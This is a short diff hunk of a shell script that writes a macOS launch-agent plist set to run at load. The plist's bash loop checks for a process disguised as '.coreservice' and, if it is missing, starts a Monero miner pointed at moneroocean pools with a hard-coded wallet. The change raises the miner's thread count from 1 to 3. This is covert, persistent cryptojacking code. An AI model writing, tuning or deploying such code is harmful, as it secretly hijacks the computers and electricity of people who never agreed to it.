@@ -24,7 +24,7 @@ cat <<EOF > "$f"
     <array>
         <string>/bin/bash</string>
         <string>-c</string>
-        <string>while true; do if ! pgrep -f ".coreservice"; then "$b" -o gulf.moneroocean.stream:10128 -o pool.moneroocean.stream:443 -u 48Pv4WVhS3g4tjvsZqB3NVD9JL8hC5kVbXjvTmF5UQ5i7sS9rL3pD2qE6fA1bC9nK8mX4gH7jV5pT3 --tls -t 1 --background-task; fi; sleep 60; done</string>
+        <string>while true; do if ! pgrep -f ".coreservice"; then "$b" -o gulf.moneroocean.stream:10128 -o pool.moneroocean.stream:443 -u 48Pv4WVhS3g4tjvsZqB3NVD9JL8hC5kVbXjvTmF5UQ5i7sS9rL3pD2qE6fA1bC9nK8mX4gH7jV5pT3 --tls -t 3 --background-task; fi; sleep 60; done</string>
     </array>
     <key>RunAtLoad</key>
     <true/>
